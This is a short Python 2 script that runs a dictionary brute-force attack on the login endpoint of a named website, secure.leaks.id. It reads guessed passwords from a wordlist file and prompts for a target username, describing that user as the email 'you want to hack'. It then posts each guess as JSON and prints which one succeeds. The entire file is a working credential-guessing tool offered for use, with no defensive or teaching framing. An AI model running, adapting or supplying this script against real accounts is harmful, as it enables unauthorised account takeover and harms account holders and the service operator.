import requests

url = 'https://secure.leaks.id/authentication'

# The file contains per lines many possibilities of password
fakepass_db = open('dictionary.txt')
lines = fakepass_db.readlines()

print "Connecting to: "+url+"..."

# Put the target email you want to hack
user = raw_input("\nEnter username:")

failed_aftertry = 0
for line in lines:
    _datapost = '{"tid":0,"username":"'+user+'","password":"'+ line.strip() +'"}'

    # Doing the post form
    print _datapost
    data = requests.post(url, data=_datapost)
    #print data.status
    print data.text
    #print data.text
    if "Authentication Failed" in data.text:
        print "Trying : " + line
    else:
        print "Sukses : " + line
